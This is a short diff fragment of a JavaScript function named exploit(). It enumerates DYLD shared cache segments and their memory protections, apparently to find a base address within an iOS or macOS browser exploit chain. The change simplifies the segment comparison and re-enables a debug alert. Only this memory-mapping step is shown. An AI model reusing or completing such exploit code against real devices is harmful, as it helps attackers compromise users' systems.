@@ -647,10 +647,10 @@ function exploit(){
             }
             log("DYLD Shared cache segment ("+seg.addr.toString(16)+"-"+Add(seg.addr, seg.size).toString(16)+"): "+init_rights+"/"+max_rights);
             
-            if(seg.fileoff.hi() == 0 && seg.fileoff.lo() == 0 && (seg.size.hi() != 0 || seg.size.lo() != 0))
+            if(segs[z].fileoff == 0 && segs[z].size != 0)
             {
-                base_seg = seg;
-                //alert(base_seg.addr)
+                base_seg = segs[z];
+                alert(base_seg.addr)
             }
         }
         if(base_seg == null)
